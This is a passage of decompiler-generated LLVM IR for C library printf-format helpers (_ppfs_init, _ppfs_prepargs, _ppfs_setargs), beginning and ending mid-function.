  uselistorder i32 %v2_14d20, { 1, 0 }
  uselistorder i32 %v0_14d64, { 1, 0, 2 }
  uselistorder i32 %v3_14cf4, { 1, 2, 0 }
  uselistorder i32 %v0_14ca4, { 1, 0 }
  uselistorder i32 %v2_14c88, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_14c50, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14c1c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_14b20, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v0_14b3c, { 1, 2, 3, 0 }
  uselistorder i32 %v6_14abc, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_14a20, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_149d0.pre, { 2, 1, 0 }
  uselistorder i32 %v1_149c8, { 1, 0 }
  uselistorder i32 %v1_14970, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-336.2, { 0, 8, 6, 1, 2, 5, 4, 3, 7 }
  uselistorder i32 %v2_14930, { 1, 0 }
  uselistorder i32 %v1_14928.lcssa, { 1, 0 }
  uselistorder i8 %v2_14914, { 1, 2, 0 }
  uselistorder i32 %v2_14928, { 1, 2, 3, 0 }
  uselistorder i1 %v7_14b34, { 1, 0 }
  uselistorder i1 %v7_14a80, { 1, 2, 0 }
  uselistorder i1 %v7_14c78, { 1, 0 }
  uselistorder i1 %v7_14bd8, { 1, 0 }
  uselistorder i1 %v7_14ac4, { 1, 0 }
  uselistorder i32 %v2_14c18, { 0, 2, 1, 3 }
  uselistorder i32 %v2_14ce8, { 3, 2, 5, 4, 11, 10, 9, 7, 8, 6, 1, 0 }
  uselistorder i32* %v1_149f8, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_149cc, { 2, 4, 3, 5, 0, 1 }
  uselistorder i32 %v2_149ac, { 1, 2, 0 }
  uselistorder i32 %v4_149a4, { 1, 0 }
  uselistorder i32 %v2_148a8, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-332, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-328, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %tmp103, { 2, 1, 0 }
  uselistorder i32 %tmp102, { 19, 18, 15, 13, 8, 9, 0, 10, 12, 11, 3, 4, 5, 6, 7, 1, 2, 17, 16, 14 }
  uselistorder i32 %tmp101, { 6, 5, 3, 2, 0, 4, 1 }
  uselistorder i32 %tmp97, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 5, 6, 3, 4, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 2, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r2.global-to-local, { 24, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 2, 22, 23, 25, 26, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 6, 5, 8, 7, 10, 9, 11, 12, 14, 13, 16, 15, 17, 18, 21, 19, 20, 23, 22, 25, 24, 27, 26, 29, 28, 33, 30, 31, 32, 1, 34, 35, 36, 37, 3, 2, 39, 38, 41, 40, 43, 42, 45, 44, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 55, { 1, 0 }
  uselistorder i32 87, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14e74, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_14e6c, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_14e5c, { 1, 0 }
  uselistorder label %dec_label_pc_14e1c, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %dec_label_pc_14d8c, { 1, 0 }
  uselistorder label %.thread29, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_14d38, { 1, 0 }
  uselistorder label %dec_label_pc_14d1c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14d1cthread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_14d10, { 1, 0 }
  uselistorder label %dec_label_pc_14d00, { 0, 2, 1 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_14c94, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %bb157, { 4, 1, 2, 0, 3 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 4, 3, 1, 0, 2 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_14a70, { 1, 0 }
  uselistorder label %dec_label_pc_14a6c, { 2, 1, 0 }
  uselistorder label %bb139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_149c4, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %dec_label_pc_14964, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_14930, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_14e94 = load i32, i32* @r4, align 4
  store i32 %v3_14e94, i32* %stack_var_-12, align 4
  %v6_14e94 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_14ea0 = load i32, i32* @r1, align 4
  store i32 %v0_14ea0, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_14ea8 = bitcast i32* %arg1 to i8*
  %v3_14ea8 = call i32 @__GI_memset(i8* %v2_14ea8, i32 0)
  %v0_14eac = load i32, i32* @r4, align 4
  %v1_14eac = add i32 %v0_14eac, 24
  %v2_14eac = inttoptr i32 %v1_14eac to i32*
  %v3_14eac = load i32, i32* %v2_14eac, align 4
  %v1_14eb0 = add i32 %v3_14eac, -1
  store i32 %v1_14eb0, i32* %v2_14eac, align 4
  %v0_14eb8 = load i32, i32* @r5, align 4
  %v1_14eb8 = load i32, i32* @r4, align 4
  %v2_14eb8 = inttoptr i32 %v1_14eb8 to i32*
  store i32 %v0_14eb8, i32* %v2_14eb8, align 4
  %v0_14ebc = load i32, i32* @r4, align 4
  %v1_14ebc = add i32 %v0_14ebc, 40
  store i32 %v1_14ebc, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_14ecc19 = inttoptr i32 %v1_14ebc to i32*
  store i32 8, i32* %v2_14ecc19, align 4
  %v3_14ecc20 = load i32, i32* %r1.global-to-local, align 4
  %v4_14ecc21 = add i32 %v3_14ecc20, 4
  store i32 %v4_14ecc21, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14ec4.dec_label_pc_14ec4_crit_edge

dec_label_pc_14ec4.dec_label_pc_14ec4_crit_edge:  ; preds = %entry, %dec_label_pc_14ec4.dec_label_pc_14ec4_crit_edge
  %v4_14ecc22 = phi i32 [ %v4_14ecc21, %entry ], [ %v4_14ecc, %dec_label_pc_14ec4.dec_label_pc_14ec4_crit_edge ]
  %v0_14ec8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14ec8 = add i32 %v0_14ec8.pre, -1
  store i32 %v1_14ec8, i32* %r2.global-to-local, align 4
  %v7_14ec8 = icmp eq i32 %v0_14ec8.pre, 1
  %v2_14ecc = inttoptr i32 %v4_14ecc22 to i32*
  store i32 8, i32* %v2_14ecc, align 4
  %v3_14ecc = load i32, i32* %r1.global-to-local, align 4
  %v4_14ecc = add i32 %v3_14ecc, 4
  store i32 %v4_14ecc, i32* %r1.global-to-local, align 4
  br i1 %v7_14ec8, label %dec_label_pc_14ed4, label %dec_label_pc_14ec4.dec_label_pc_14ec4_crit_edge

dec_label_pc_14ed4:                               ; preds = %dec_label_pc_14ec4.dec_label_pc_14ec4_crit_edge
  %v0_14ed4 = load i32, i32* @r5, align 4
  store i32 %v0_14ed4, i32* %r2.global-to-local, align 4
  %v1_14f183 = inttoptr i32 %v0_14ed4 to i8*
  %v2_14f184 = load i8, i8* %v1_14f183, align 1
  %v2_14f1c6 = icmp eq i8 %v2_14f184, 0
  br i1 %v2_14f1c6, label %dec_label_pc_14f24, label %dec_label_pc_14ee4

dec_label_pc_14edc:                               ; preds = %dec_label_pc_14efc
  %v2_14ee0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14ee0, i32* @r4, align 4
  store i32 %v6_14e94, i32* @r5, align 4
  ret i32 -1

dec_label_pc_14ee4:                               ; preds = %dec_label_pc_14ed4, %dec_label_pc_14f18.backedge
  %v0_14eec = phi i32 [ %storemerge, %dec_label_pc_14f18.backedge ], [ %v0_14ed4, %dec_label_pc_14ed4 ]
  %v2_14f187 = phi i8 [ %v2_14f18, %dec_label_pc_14f18.backedge ], [ %v2_14f184, %dec_label_pc_14ed4 ]
  %v7_14ee4 = icmp eq i8 %v2_14f187, 37
  br i1 %v7_14ee4, label %dec_label_pc_14eec, label %dec_label_pc_14f14

dec_label_pc_14eec:                               ; preds = %dec_label_pc_14ee4
  %v1_14eec = add i32 %v0_14eec, 1
  %v2_14eec = inttoptr i32 %v1_14eec to i8*
  %v3_14eec = load i8, i8* %v2_14eec, align 1
  store i32 %v1_14eec, i32* %r2.global-to-local, align 4
  %v7_14ef0 = icmp eq i8 %v3_14eec, 37
  br i1 %v7_14ef0, label %dec_label_pc_14f14, label %dec_label_pc_14efc

dec_label_pc_14efc:                               ; preds = %dec_label_pc_14eec
  %v0_14ef4 = load i32, i32* @r4, align 4
  %v2_14efc = inttoptr i32 %v0_14ef4 to i32*
  store i32 %v1_14eec, i32* %v2_14efc, align 4
  %v2_14f00 = call i32 @_ppfs_parsespec(i32* %v2_14efc)
  %v1_14f04 = icmp slt i32 %v2_14f00, 0
  br i1 %v1_14f04, label %dec_label_pc_14edc, label %dec_label_pc_14f0c

dec_label_pc_14f0c:                               ; preds = %dec_label_pc_14efc
  %v0_14f0c = load i32, i32* @r4, align 4
  %v1_14f0c = inttoptr i32 %v0_14f0c to i32*
  %v2_14f0c = load i32, i32* %v1_14f0c, align 4
  br label %dec_label_pc_14f18.backedge

dec_label_pc_14f14:                               ; preds = %dec_label_pc_14ee4, %dec_label_pc_14eec
  %v0_14f14 = phi i32 [ %v0_14eec, %dec_label_pc_14ee4 ], [ %v1_14eec, %dec_label_pc_14eec ]
  %v1_14f14 = add i32 %v0_14f14, 1
  br label %dec_label_pc_14f18.backedge

dec_label_pc_14f18.backedge:                      ; preds = %dec_label_pc_14f14, %dec_label_pc_14f0c
  %storemerge = phi i32 [ %v1_14f14, %dec_label_pc_14f14 ], [ %v2_14f0c, %dec_label_pc_14f0c ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_14f18 = inttoptr i32 %storemerge to i8*
  %v2_14f18 = load i8, i8* %v1_14f18, align 1
  %v2_14f1c = icmp eq i8 %v2_14f18, 0
  br i1 %v2_14f1c, label %dec_label_pc_14f18.dec_label_pc_14f24_crit_edge, label %dec_label_pc_14ee4

dec_label_pc_14f18.dec_label_pc_14f24_crit_edge:  ; preds = %dec_label_pc_14f18.backedge
  %v0_14f24.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14f24

dec_label_pc_14f24:                               ; preds = %dec_label_pc_14f18.dec_label_pc_14f24_crit_edge, %dec_label_pc_14ed4
  %v0_14f24 = phi i32 [ %v0_14f24.pre, %dec_label_pc_14f18.dec_label_pc_14f24_crit_edge ], [ %v0_14ed4, %dec_label_pc_14ed4 ]
  %v3_14f18.lcssa.in = phi i8 [ %v2_14f18, %dec_label_pc_14f18.dec_label_pc_14f24_crit_edge ], [ %v2_14f184, %dec_label_pc_14ed4 ]
  %v3_14f18.lcssa = zext i8 %v3_14f18.lcssa.in to i32
  %v1_14f24 = load i32, i32* @r4, align 4
  %v2_14f24 = inttoptr i32 %v1_14f24 to i32*
  store i32 %v0_14f24, i32* %v2_14f24, align 4
  %v2_14f28 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14f28, i32* @r4, align 4
  store i32 %v6_14e94, i32* @r5, align 4
  ret i32 %v3_14f18.lcssa

; uselistorder directives
  uselistorder i8 %v2_14f18, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_14ed4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14ecc, { 1, 0 }
  uselistorder i32 %v0_14ec8.pre, { 1, 0 }
  uselistorder i32 %v6_14e94, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 5, 4, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 152, { 1, 0 }
  uselistorder label %dec_label_pc_14f14, { 1, 0 }
  uselistorder label %dec_label_pc_14ee4, { 1, 0 }
  uselistorder label %dec_label_pc_14ec4.dec_label_pc_14ec4_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14f2c = load i32, i32* @r4, align 4
  store i32 %v3_14f2c, i32* %stack_var_-12, align 4
  %v1_14f30 = add i32 %arg1, 24
  %v2_14f30 = inttoptr i32 %v1_14f30 to i32*
  %v3_14f30 = load i32, i32* %v2_14f30, align 4
  store i32 %v3_14f30, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_14f40 = add i32 %arg1, 76
  %v3_14f40 = inttoptr i32 %v2_14f40 to i32*
  store i32 %arg2, i32* %v3_14f40, align 4
  %v7_14f44 = icmp sgt i32 %v3_14f30, 0
  br i1 %v7_14f44, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v10_14f44 = load i32, i32* %stack_var_-12, align 4
  store i32 %v10_14f44, i32* @r4, align 4
  ret i32 %arg1

bb4:                                              ; preds = %entry
  %v0_14f48 = load i32, i32* %r3.global-to-local, align 4
  %v2_14f48 = add i32 %arg1, 8
  %v3_14f48 = inttoptr i32 %v2_14f48 to i32*
  store i32 %v0_14f48, i32* %v3_14f48, align 4
  %v0_14f4c = load i32, i32* %r5.global-to-local, align 4
  %v2_14f4c = add i32 %arg1, 28
  %v3_14f4c = inttoptr i32 %v2_14f4c to i32*
  store i32 %v0_14f4c, i32* %v3_14f4c, align 4
  %v0_14f50 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_14f50, i32* %v2_14f30, align 4
  %v0_14f54 = load i32, i32* %r3.global-to-local, align 4
  %v2_14f54 = add i32 %arg1, 4
  %v3_14f54 = inttoptr i32 %v2_14f54 to i32*
  store i32 %v0_14f54, i32* %v3_14f54, align 4
  %v0_14f58 = call i32 @_ppfs_setargs()
  %v0_14f5c = load i32, i32* %r5.global-to-local, align 4
  %v1_14f5c = load i32, i32* @r4, align 4
  %v2_14f5c = add i32 %v1_14f5c, 24
  %v3_14f5c = inttoptr i32 %v2_14f5c to i32*
  store i32 %v0_14f5c, i32* %v3_14f5c, align 4
  %v2_14f60 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14f60, i32* @r4, align 4
  ret i32 %v0_14f58

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 6, 5, 3, 2, 1, 4, 7 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_14f64 = load i32, i32* @r0, align 4
  %v1_14f64 = add i32 %v0_14f64, 24
  %v2_14f64 = inttoptr i32 %v1_14f64 to i32*
  %v3_14f64 = load i32, i32* %v2_14f64, align 4
  store i32 %v3_14f64, i32* %r1.global-to-local, align 4
  %v2_14f68 = icmp eq i32 %v3_14f64, 0
  %v3_14f6c = load i32, i32* @r4, align 4
  store i32 %v3_14f6c, i32* %stack_var_-8, align 4
  %v1_14f70 = add i32 %v0_14f64, 80
  store i32 %v1_14f70, i32* %ip.global-to-local, align 4
  %v1_14f74 = add i32 %v0_14f64, 8
  %v2_14f74 = inttoptr i32 %v1_14f74 to i32*
  %v3_14f74 = load i32, i32* %v2_14f74, align 4
  store i32 %v3_14f74, i32* %r3.global-to-local, align 4
  %v6_14f7c = icmp eq i32 %v3_14f74, -2147483648
  br i1 %v2_14f68, label %dec_label_pc_14f7c, label %dec_label_pc_150a0

dec_label_pc_14f7c:                               ; preds = %entry
  br i1 %v6_14f7c, label %dec_label_pc_14f84, label %dec_label_pc_14f9c

dec_label_pc_14f84:                               ; preds = %dec_label_pc_14f7c
  %v1_14f84 = add i32 %v0_14f64, 76
  %v2_14f84 = inttoptr i32 %v1_14f84 to i32*
  %v3_14f84 = load i32, i32* %v2_14f84, align 4
  store i32 %v3_14f84, i32* %r3.global-to-local, align 4
  %v1_14f88 = inttoptr i32 %v3_14f84 to i32*
  %v2_14f88 = load i32, i32* %v1_14f88, align 4
  store i32 %v2_14f88, i32* %r2.global-to-local, align 4
  %v1_14f8c = add i32 %v3_14f84, 4
  store i32 %v1_14f8c, i32* %r3.global-to-local, align 4
  store i32 %v1_14f8c, i32* %v2_14f84, align 4
  %v0_14f94 = load i32, i32* %r2.global-to-local, align 4
  %v1_14f94 = load i32, i32* @r0, align 4
  %v2_14f94 = add i32 %v1_14f94, 8
  %v3_14f94 = inttoptr i32 %v2_14f94 to i32*
  store i32 %v0_14f94, i32* %v3_14f94, align 4
  %v0_14f98 = load i32, i32* %r2.global-to-local, align 4
  %v1_14f98 = load i32, i32* @r0, align 4
  %v2_14f98 = add i32 %v1_14f98, 80
  %v3_14f98 = inttoptr i32 %v2_14f98 to i32*
  store i32 %v0_14f98, i32* %v3_14f98, align 4
  %v0_14f9c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14f9c

dec_label_pc_14f9c:                               ; preds = %dec_label_pc_14f7c, %dec_label_pc_14f84
  %v1_14fb4 = phi i32 [ %v0_14f64, %dec_label_pc_14f7c ], [ %v0_14f9c.pre, %dec_label_pc_14f84 ]
  %v1_14f9c = add i32 %v1_14fb4, 4
  %v2_14f9c = inttoptr i32 %v1_14f9c to i32*
  %v3_14f9c = load i32, i32* %v2_14f9c, align 4
  store i32 %v3_14f9c, i32* %r3.global-to-local, align 4
  %v6_14fa0 = icmp eq i32 %v3_14f9c, -2147483648
  br i1 %v6_14fa0, label %dec_label_pc_14fa8, label %dec_label_pc_14fc0

dec_label_pc_14fa8:                               ; preds = %dec_label_pc_14f9c
  %v1_14fa8 = add i32 %v1_14fb4, 76
  %v2_14fa8 = inttoptr i32 %v1_14fa8 to i32*
  %v3_14fa8 = load i32, i32* %v2_14fa8, align 4
  store i32 %v3_14fa8, i32* %r3.global-to-local, align 4
  %v1_14fac = inttoptr i32 %v3_14fa8 to i32*
  %v2_14fac = load i32, i32* %v1_14fac, align 4
  store i32 %v2_14fac, i32* %r2.global-to-local, align 4
  %v1_14fb0 = add i32 %v3_14fa8, 4
  store i32 %v1_14fb0, i32* %r3.global-to-local, align 4
  store i32 %v1_14fb0, i32* %v2_14fa8, align 4
  %v0_14fb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_14fb8 = load i32, i32* @r0, align 4
  %v2_14fb8 = add i32 %v1_14fb8, 4
  %v3_14fb8 = inttoptr i32 %v2_14fb8 to i32*
  store i32 %v0_14fb8, i32* %v3_14fb8, align 4
  %v0_14fbc = load i32, i32* %r2.global-to-local, align 4
  %v1_14fbc = load i32, i32* @r0, align 4
  %v2_14fbc = add i32 %v1_14fbc, 80
  %v3_14fbc = inttoptr i32 %v2_14fbc to i32*
  store i32 %v0_14fbc, i32* %v3_14fbc, align 4
  %v0_1509018.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14fc0

dec_label_pc_14fc0:                               ; preds = %dec_label_pc_14f9c, %dec_label_pc_14fa8
  %v0_1509018 = phi i32 [ %v1_14fb4, %dec_label_pc_14f9c ], [ %v0_1509018.pre, %dec_label_pc_14fa8 ]
  %v0_14fc0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14fc0, i32* %lr.global-to-local, align 4
  %v1_1509019 = add i32 %v0_1509018, 28
  %v2_1509020 = inttoptr i32 %v1_1509019 to i32*
  %v3_1509021 = load i32, i32* %v2_1509020, align 4
  store i32 %v3_1509021, i32* %r3.global-to-local, align 4
  %v5_1509823 = icmp slt i32 %v0_14fc0, %v3_1509021
  br i1 %v5_1509823, label %dec_label_pc_14fc8, label %dec_label_pc_1509c.loopexit

dec_label_pc_14fc8:                               ; preds = %dec_label_pc_14fc0, %dec_label_pc_1508c
  %v0_1509025 = phi i32 [ %v0_15090, %dec_label_pc_1508c ], [ %v0_1509018, %dec_label_pc_14fc0 ]
  %v1_14fc824 = phi i32 [ %v1_1508c, %dec_label_pc_1508c ], [ %v0_14fc0, %dec_label_pc_14fc0 ]
  %v4_14fc8 = mul i32 %v1_14fc824, 4
  %v5_14fc8 = add i32 %v0_1509025, %v4_14fc8
  store i32 %v5_14fc8, i32* %r3.global-to-local, align 4
  %v1_14fcc = add i32 %v5_14fc8, 40
  %v2_14fcc = inttoptr i32 %v1_14fcc to i32*
  %v3_14fcc = load i32, i32* %v2_14fcc, align 4
  store i32 %v3_14fcc, i32* %r2.global-to-local, align 4
  %v7_14fd0 = icmp eq i32 %v3_14fcc, 8
  br i1 %v7_14fd0, label %dec_label_pc_1508c, label %dec_label_pc_14fd8

dec_label_pc_14fd8:                               ; preds = %dec_label_pc_14fc8
  %v1_14fd8 = add i32 %v0_1509025, 76
  %v2_14fd8 = inttoptr i32 %v1_14fd8 to i32*
  %v3_14fd8 = load i32, i32* %v2_14fd8, align 4
  store i32 %v3_14fd8, i32* %r1.global-to-local, align 4
  %v8_14fdc = icmp sgt i32 %v3_14fcc, 8
  br i1 %v8_14fdc, label %dec_label_pc_15000, label %dec_label_pc_14fe0

dec_label_pc_14fe0:                               ; preds = %dec_label_pc_14fd8
  %v7_14fe0 = icmp eq i32 %v3_14fcc, 2
  br i1 %v7_14fe0, label %dec_label_pc_1504c, label %dec_label_pc_14fe8

dec_label_pc_14fe8:                               ; preds = %dec_label_pc_14fe0
  %v8_14fe8 = icmp sgt i32 %v3_14fcc, 2
  br i1 %v8_14fe8, label %dec_label_pc_14ff8, label %dec_label_pc_14fec

dec_label_pc_14fec:                               ; preds = %dec_label_pc_14fe8
  %v1_14fec = icmp slt i32 %v3_14fcc, 0
  br i1 %v1_14fec, label %dec_label_pc_15078, label %dec_label_pc_1504c

dec_label_pc_14ff8:                               ; preds = %dec_label_pc_14fe8
  %v7_14ff8 = icmp eq i32 %v3_14fcc, 7
  br i1 %v7_14ff8, label %dec_label_pc_15060, label %dec_label_pc_15078

dec_label_pc_15000:                               ; preds = %dec_label_pc_14fd8
  %v7_15000 = icmp eq i32 %v3_14fcc, 1024
  br i1 %v7_15000, label %dec_label_pc_1504c, label %dec_label_pc_15008

dec_label_pc_15008:                               ; preds = %dec_label_pc_15000
  %v8_15008 = icmp sgt i32 %v3_14fcc, 1024
  br i1 %v8_15008, label %dec_label_pc_15020, label %dec_label_pc_1500c

dec_label_pc_1500c:                               ; preds = %dec_label_pc_15008
  switch i32 %v3_14fcc, label %dec_label_pc_15078 [
    i32 256, label %dec_label_pc_1504c
    i32 512, label %dec_label_pc_1504c
  ]

dec_label_pc_15020:                               ; preds = %dec_label_pc_15008
  %v7_15020 = icmp eq i32 %v3_14fcc, 2048
  br i1 %v7_15020, label %dec_label_pc_15038, label %dec_label_pc_15030

dec_label_pc_15030:                               ; preds = %dec_label_pc_15020
  store i32 2055, i32* %r3.global-to-local, align 4
  %v9_1502c = icmp eq i32 %v3_14fcc, 2055
  br i1 %v9_1502c, label %dec_label_pc_15060, label %dec_label_pc_15078

dec_label_pc_15038:                               ; preds = %dec_label_pc_15020
  %v1_15038 = add i32 %v3_14fd8, 8
  store i32 %v1_15038, i32* %r3.global-to-local, align 4
  store i32 %v1_15038, i32* %v2_14fd8, align 4
  %v0_15040 = load i32, i32* %r1.global-to-local, align 4
  %v1_15040 = inttoptr i32 %v0_15040 to i32*
  %v2_15040 = load i32, i32* %v1_15040, align 4
  store i32 %v2_15040, i32* %r3.global-to-local, align 4
  %v3_15040 = add i32 %v0_15040, 4
  %v4_15040 = inttoptr i32 %v3_15040 to i32*
  %v5_15040 = load i32, i32* %v4_15040, align 4
  store i32 %v5_15040, i32* %r4.global-to-local, align 4
  %v0_15044 = load i32, i32* %ip.global-to-local, align 4
  %v1_15044 = inttoptr i32 %v0_15044 to i32*
  store i32 %v2_15040, i32* %v1_15044, align 4
  %v3_15044 = add i32 %v0_15044, 4
  %v4_15044 = inttoptr i32 %v3_15044 to i32*
  %v5_15044 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15044, i32* %v4_15044, align 4
  br label %dec_label_pc_15088

dec_label_pc_1504c:                               ; preds = %dec_label_pc_1500c, %dec_label_pc_1500c, %dec_label_pc_14fec, %dec_label_pc_15000, %dec_label_pc_14fe0
  %v1_1504c = inttoptr i32 %v3_14fd8 to i32*
  %v2_1504c = load i32, i32* %v1_1504c, align 4
  store i32 %v2_1504c, i32* %r2.global-to-local, align 4
  %v1_15050 = add i32 %v3_14fd8, 4
  store i32 %v1_15050, i32* %r3.global-to-local, align 4
  store i32 %v1_15050, i32* %v2_14fd8, align 4
  %v0_15058 = load i32, i32* %r2.global-to-local, align 4
  %v1_15058 = load i32, i32* %ip.global-to-local, align 4
  %v2_15058 = inttoptr i32 %v1_15058 to i32*
  store i32 %v0_15058, i32* %v2_15058, align 4
  br label %dec_label_pc_15088

dec_label_pc_15060:                               ; preds = %dec_label_pc_14ff8, %dec_label_pc_15030
  %v3_15060 = load i32, i32* %v2_14fd8, align 4
  store i32 %v3_15060, i32* %r3.global-to-local, align 4
  %v1_15064 = inttoptr i32 %v3_15060 to i32*
  %v2_15064 = load i32, i32* %v1_15064, align 4
  store i32 %v2_15064, i32* %r1.global-to-local, align 4
  %v3_15064 = add i32 %v3_15060, 4
  %v4_15064 = inttoptr i32 %v3_15064 to i32*
  %v5_15064 = load i32, i32* %v4_15064, align 4
  store i32 %v5_15064, i32* %r2.global-to-local, align 4
  %v1_15068 = add i32 %v3_15060, 8
  store i32 %v1_15068, i32* %r3.global-to-local, align 4
  store i32 %v1_15068, i32* %v2_14fd8, align 4
  %v0_15070 = load i32, i32* %ip.global-to-local, align 4
  %v1_15070 = inttoptr i32 %v0_15070 to i32*
  %v2_15070 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_15070, i32* %v1_15070, align 4
  %v3_15070 = add i32 %v0_15070, 4
  %v4_15070 = inttoptr i32 %v3_15070 to i32*
  %v5_15070 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_15070, i32* %v4_15070, align 4
  br label %dec_label_pc_15088

dec_label_pc_15078:                               ; preds = %dec_label_pc_1500c, %dec_label_pc_14ff8, %dec_label_pc_14fec, %dec_label_pc_15030
  %v1_15078 = add i32 %v3_14fd8, 4
  store i32 %v1_15078, i32* %r3.global-to-local, align 4
  store i32 %v1_15078, i32* %v2_14fd8, align 4
  %v0_15080 = load i32, i32* %r1.global-to-local, align 4
  %v1_15080 = inttoptr i32 %v0_15080 to i32*
  %v2_15080 = load i32, i32* %v1_15080, align 4
  store i32 %v2_15080, i32* %r3.global-to-local, align 4
  %v1_15084 = load i32, i32* %ip.global-to-local, align 4
  %v2_15084 = inttoptr i32 %v1_15084 to i32*
  store i32 %v2_15080, i32* %v2_15084, align 4
  br label %dec_label_pc_15088

dec_label_pc_15088:                               ; preds = %dec_label_pc_15060, %dec_label_pc_1504c, %dec_label_pc_15038, %dec_label_pc_15078
  %v0_15088 = load i32, i32* %ip.global-to-local, align 4
  %v1_15088 = add i32 %v0_15088, 8
  store i32 %v1_15088, i32* %ip.global-to-local, align 4
  %v0_1508c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_15090.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1508c

dec_label_pc_1508c:                               ; preds = %dec_label_pc_14fc8, %dec_label_pc_15088
  %v0_15090 = phi i32 [ %v0_1509025, %dec_label_pc_14fc8 ], [ %v0_15090.pre, %dec_label_pc_15088 ]
  %v0_1508c = phi i32 [ %v1_14fc824, %dec_label_pc_14fc8 ], [ %v0_1508c.pre, %dec_label_pc_15088 ]
  %v1_1508c = add i32 %v0_1508c, 1
  store i32 %v1_1508c, i32* %lr.global-to-local, align 4
  %v1_15090 = add i32 %v0_15090, 28
  %v2_15090 = inttoptr i32 %v1_15090 to i32*
  %v3_15090 = load i32, i32* %v2_15090, align 4
  store i32 %v3_15090, i32* %r3.global-to-local, align 4
  %v5_15098 = icmp slt i32 %v1_1508c, %v3_15090
